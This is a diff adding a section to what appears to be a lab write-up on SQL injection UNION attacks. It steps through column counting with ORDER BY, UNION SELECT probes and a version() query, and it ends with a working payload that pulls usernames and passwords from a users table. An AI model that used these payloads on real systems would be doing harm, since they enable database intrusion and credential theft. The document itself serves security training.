@@ -50,3 +50,16 @@ SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,username||':'|
 ```
 
 > Payload : `' UNION SELECT NULL,username||':'||password FROM users--`
+
+## SQL injection UNION attack, retrieving multiple values in a single column
+
+```sql
+SELECT * FROM products WHERE category = 'Gifts'
+SELECT * FROM products WHERE category = 'Gifts' ORDER BY 3--'
+SELECT * FROM products WHERE category = 'Gifts' UNION SELECT 'a','a'--'
+SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,version()--'
+SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,username||':'||password FROM users--'
+```
+
+> Payload : `' UNION SELECT NULL,username||':'||password FROM users--`
+
